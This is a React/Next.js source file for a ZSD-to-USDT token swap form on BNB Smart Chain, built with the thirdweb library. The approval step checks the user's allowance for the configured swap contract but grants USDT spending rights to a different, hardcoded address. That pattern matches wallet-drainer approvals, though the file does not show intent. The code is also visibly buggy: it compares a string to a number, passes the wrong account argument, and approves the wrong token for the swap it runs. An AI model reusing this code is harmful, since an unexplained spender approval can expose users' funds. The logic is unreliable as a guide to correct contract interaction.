"use client";
import React, { useState, useEffect } from "react";
import { Button, Form, Input, Row, Col, Select } from "antd";
import {
  createThirdwebClient,
  getContract,
  prepareContractCall,
  toWei,
  readContract,
  sendAndConfirmTransaction,
} from "thirdweb";
import { useSendTransaction, useActiveAccount } from "thirdweb/react";
import { approve, balanceOf, allowance } from "thirdweb/extensions/erc20";
import styles from "./index.module.scss";
const THIRDWEB_PROJECT_ID: any = process.env.NEXT_PUBLIC_TEMPLATE_CLIENT_ID;
export const client = createThirdwebClient({ clientId: THIRDWEB_PROJECT_ID });

// 导入API配置
import { APIConfig } from "../../abi/APIConfiguration";
import { bsc } from "thirdweb/chains";
import { USDTAbi } from "../../abi/USDTAbi";
import { ZSDABI } from "../../abi/ZSDABI";
import { ZSDSwapABI } from "../../abi/ZSDSwapABI";
import { ZSDPROJECTABI } from "../../abi/ZSDPROJECTABI";

const USDTAbinew: any = USDTAbi;
const ZSDNewABI: any = ZSDABI;
const contractwapABI: any = ZSDSwapABI;
const contractROJECTABI: any = ZSDPROJECTABI;

//USDT
//USDT
const USDTContract = getContract({
  client: client,
  address: APIConfig.USDTaddress,
  chain: bsc,
});

//ZSD
const ZSDContract = getContract({
  client: client,
  address: APIConfig.ZSDaddress,
  abi: ZSDNewABI,
  chain: bsc,
});

// ZSDPROJECT
const ZSDPROJECTContract = getContract({
  client: client,
  address: APIConfig.ZSDPROJECTAddress,
  abi: contractROJECTABI,
  chain: bsc,
});

//ZSDSWAP
const ZSDSWAPContract = getContract({
  client: client,
  address: APIConfig.ZSDSwapAddress,
  abi: contractwapABI,
  chain: bsc,
});


const { Option } = Select;
const Commonform = () => {
  const [form] = Form.useForm();
  const account: any = useActiveAccount();
  const { mutate: sendTransaction, isPending } = useSendTransaction();
  const [price, SetPrice] = useState<any>(0);
  const [priceAccount, SetPriceAccount] = useState<any>(0);


  const selectAfterone = (
    <Select defaultValue="ZSD" className="select-after">
      <Option value="ZSD">ZSD</Option>
    </Select>
  );

  const selectAftertwo = (
    <Select defaultValue="USDT" className="select-after">
      <Option value="USDT">USDT</Option>
    </Select>
  );

  const USDtoZSDnumFun = async () => {
    try {
      const USDtoZSDnum = await readContract({
        contract: ZSDSWAPContract,
        method: "function getAmountZSDOut(uint256) view returns (uint256)",
        params: [BigInt(1000000000000000000)],
      });
      const WeiBalance = USDtoZSDnum.toString();
      SetPrice(WeiBalance)
    } catch (error) {
      console.error("查询失败:", error);
    }
  };

  const onFinish = async (values: any) => {
    // console.log(APIConfig.ZSDSwapAddress, "Received values of form: ", account.address);
    try {
      // const allowanceUSDTBalance = await readContract({
      //   contract: USDTContract,
      //   method: "function allowance(address, address) returns(uint256)",
      //   params: [account.address, APIConfig.ZSDSwapAddress],
      // });
      const banlance: any = 10000000000;
      const allowanceUSDTBalance = await allowance({
        contract: USDTContract,
        owner: account.address,
        spender: APIConfig.ZSDSwapAddress
      });
      console.log(allowanceUSDTBalance.toString(), '================');

      if (allowanceUSDTBalance.toString() <= banlance) {
        //zsd合约有权限调用用户 balance的资产
        //用户将自己的 将自己usdt转出banlance的权限赋予zsd合约
        // const tx1 = prepareContractCall({
        //   contract: USDTContract,
        //   method: "function approve(address, uint256) returns (bool)",
        //   params: [APIConfig.ZSDSwapAddress, banlance],
        // });

        const transaction = await approve({
          contract: USDTContract,
          spender: '0x1b4a03f2f80d842b28582252ab9b1d32a4840400',
          amount: banlance,
        });

        // 用户将usdt转给zsd合约
        const tx1Result = await sendAndConfirmTransaction({
          transaction: transaction,
          account: account.address,
        });
        return;
      }


      console.log('11111111111111111111')
      // 兑换
      const transaction = prepareContractCall({
        contract: ZSDSWAPContract,
        method: "function zsdtTokenTousdtTokenSwap(uint256 amountzsdtToken)",
        params: [toWei(values.ZSD_two_amount)],
      });
      const result = await sendTransaction(transaction);

      console.log(result, 'resultresultresult');
    } catch (error) {
      console.error("Failed to withdraw USDT:", error);
    }
  };

  const amountValidator = (rule: any, value: any) => {
    if (!value) {
      return Promise.resolve();
    }
    const reg = /^[0-9]*$/;
    if (!reg.test(value)) {
      return Promise.reject(
        new Error("请输入有效的数字，不能输入负数和其他字符！")
      );
    }
    return Promise.resolve();
  };


  useEffect(() => {
    if (account) {
      SetPriceAccount(account.address)
    }
  }, [account]);


  useEffect(() => {
    USDtoZSDnumFun()
  }, []);
  return (
    <>
      <div className={styles.Content}>
        <span className={styles.ContentText}>交易所</span>
        <Form
          name="amount"
          onFinish={onFinish}
          form={form}
          layout="vertical"
          style={{
            color: "white",
          }}
        >
          <Row>
            <Col span={24}>
              <Form.Item
                label={<span className={styles.Contentlabel}>代币兑换</span>}
                colon={false}
                name="USDT_one_amount"
                rules={[
                  { required: true, message: "请输入充入金额!" },
                  { validator: amountValidator },
                ]}
              >
                <Input
                  addonAfter={selectAfterone}
                  placeholder="请输入数量"
                  className={styles.inputstyle}
                  onChange={(e: any) => {
                    const tokenValue = (e.target.value) / price * 10 ** 18;
                    form.setFieldsValue({
                      ZSD_two_amount: tokenValue,
                    });
                  }}
                />
              </Form.Item>
            </Col>
            <Col span={24}>
              <Form.Item
                colon={false}
                name="ZSD_two_amount"
              >
                <Input
                  addonAfter={selectAftertwo}
                  className={styles.inputstyle}
                  disabled
                />
              </Form.Item>
            </Col>
          </Row>
          <Row>
            <Col span={24}>
              <Form.Item>
                <Button
                  type="primary"
                  htmlType="submit"
                  className={styles.buttonstyle}
                >
                  兑换
                </Button>
              </Form.Item>
            </Col>
          </Row>
        </Form>
      </div>
    </>
  );
};

export default Commonform;
